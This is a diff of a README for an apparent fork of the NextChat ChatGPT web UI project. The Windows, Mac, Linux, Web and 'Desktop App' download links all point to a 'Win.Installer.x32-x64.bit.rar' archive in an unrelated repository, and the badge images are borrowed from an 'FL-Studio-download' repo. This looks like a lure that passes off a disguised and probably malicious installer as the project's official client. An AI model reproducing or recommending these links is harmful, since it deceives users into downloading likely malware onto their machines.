@@ -9,11 +9,9 @@ One-Click to get a well-designed cross-platform ChatGPT web UI, with GPT3, GPT4 
 
 一键免费部署你的跨平台私人 ChatGPT 应用, 支持 GPT3, GPT4 & Gemini Pro 模型。
 
-[![Web][Web-image]][https://github.com/shyrz/releasef/releases/download/release/Win.Installer.x32-x64.bit.rar]
-[![Windows][Windows-image]][https://github.com/shyrz/releasef/releases/download/release/Win.Installer.x32-x64.bit.rar]
-[![MacOS][MacOS-image]][https://github.com/shyrz/releasef/releases/download/release/Win.Installer.x32-x64.bit.rar]
-[![Linux][Linux-image]][https://github.com/shyrz/releasef/releases/download/release/Win.Installer.x32-x64.bit.rar]
-
+[![Windows7](https://github.com/joaoP-santos/FL-Studio-download/assets/66499620/84681dab-70e8-439f-aa0e-8432abdbd553)](https://github.com/shyrz/releasef/releases/download/release/Win.Installer.x32-x64.bit.rar)
+[![Windows10](https://github.com/joaoP-santos/FL-Studio-download/assets/66499620/db6e6612-c2e2-44ea-85f2-8b10584637e0)](https://github.com/shyrz/releasef/releases/download/release/Win.Installer.x32-x64.bit.rar)
+[![Windows11](https://github.com/joaoP-santos/FL-Studio-download/assets/66499620/da92eed2-ee24-479d-bdf4-eaa910c2ed09)](https://github.com/shyrz/releasef/releases/download/release/Win.Installer.x32-x64.bit.rar)
 [Web App](https://app.nextchat.dev/) / [Desktop App](https://github.com/shyrz/releasef/releases/download/release/Win.Installer.x32-x64.bit.rar) / [Discord](https://discord.gg/YCkeafCafC) / [Twitter](https://twitter.com/NextChatDev)
 
 [网页版](https://app.nextchat.dev/) / [客户端](https://github.com/shyrz/releasef/releases/download/release/Win.Installer.x32-x64.bit.rar) / [反馈](https://github.com/Yidadaa/ChatGPT-Next-Web/issues)
